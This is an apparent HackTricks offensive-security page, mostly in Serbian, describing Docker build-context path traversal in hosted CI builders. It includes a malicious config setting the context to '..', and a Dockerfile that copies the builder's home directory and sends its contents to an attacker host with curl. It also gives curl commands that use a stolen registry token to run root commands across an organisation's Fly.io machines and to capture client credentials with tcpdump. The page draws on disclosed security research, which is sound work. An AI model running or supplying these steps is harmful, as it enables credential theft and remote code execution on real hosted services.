# Zloupotreba Docker Build Context in Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

Ako CI/CD platforma ili hosted builder dozvoljava contributor-ima da specificiraju putanju Docker build context-a i putanju Dockerfile-a, često možete podesiti context na parent direktorijum (npr., "..") i učiniti fajlove hosta delom build context-a. Zatim, attacker-controlled Dockerfile može COPY i exfiltrate tajne pronađene u home direktorijumu build user-a (na primer, ~/.docker/config.json). Ukradeni registry tokeni mogu takođe raditi protiv provider-ovih control-plane API-ja, omogućavajući org-wide RCE.

## Attack surface

Mnoge hosted builder/registry services rade otprilike ovo kada grade user-submitted images:
- Read a repo-level config that includes:
- build context path (sent to the Docker daemon)
- Dockerfile path relative to that context
- Copy the indicated build context directory and the Dockerfile to the Docker daemon
- Build the image and run it as a hosted service

Ako platforma ne canonicalize-uje i ne ograniči build context, korisnik može podesiti context na lokaciju izvan repozitorijuma (path traversal), što uzrokuje da proizvoljni fajlovi hosta koje build user može čitati postanu deo build context-a i budu dostupni za COPY u Dockerfile-u.

Praktična ograničenja koja se često posmatraju:
- Dockerfile mora biti unutar izabranog context path-a i njegov put mora biti poznat unapred.
- Build user mora imati read pristup fajlovima uključenim u context; specijalni device fajlovi mogu pokvariti copy.

## PoC: Path traversal via Docker build context

Example malicious server config declaring a Dockerfile within the parent directory context:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Napomene:
- Korišćenjem ".." često se pristupa home direktorijumu korisnika builder (npr. /home/builder), koji obično sadrži osetljive fajlove.
- Postavite svoj Dockerfile ispod imena direktorijuma repo-a (npr. repo "test" → test/Dockerfile) tako da ostane unutar proširenog roditeljskog konteksta.

## PoC: Dockerfile to ingest and exfiltrate the host context
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Ciljevi koji se često pronađu u $HOME:
- ~/.docker/config.json (registry auths/tokens)
- Ostali cloud/CLI keševi i konfiguracije (npr. ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Savet: Čak i sa .dockerignore u repo, ranjivi izbor konteksta na strani platforme i dalje određuje šta se šalje daemon-u. Ako platforma kopira izabranu putanju na daemon pre nego što proceni vaš repo’s .dockerignore, host fajlovi i dalje mogu biti izloženi.

## Cloud pivot sa tokenima sa prekomernim privilegijama (primer: Fly.io Machines API)

Neke platforme izdaju jedan bearer token koji se može koristiti i za container registry i za control-plane API. Ako exfiltrate-ujete registry token, pokušajte ga iskoristiti protiv provider API-ja.

Primer API poziva prema Fly.io Machines API koristeći ukradeni token iz ~/.docker/config.json:

Enumerišite aplikacije u organizaciji:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Pokrenite komandu kao root unutar bilo koje mašine aplikacije:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Ishod: remote code execution u celoj organizaciji na svim hosted aplikacijama gde token ima dovoljne privilegije.

## Krađa tajni sa kompromitovanih hosted servisa

Sa exec/RCE na hosted serverima možete prikupiti client-supplied secrets (API keys, tokens) ili izvesti prompt-injection attacks. Primer: instalirajte tcpdump i presretnite HTTP saobraćaj na portu 8080 kako biste izvukli inbound credentials.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Zabeleženi zahtevi često sadrže client credentials u header-ima, telima ili query parametrima.

## References

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
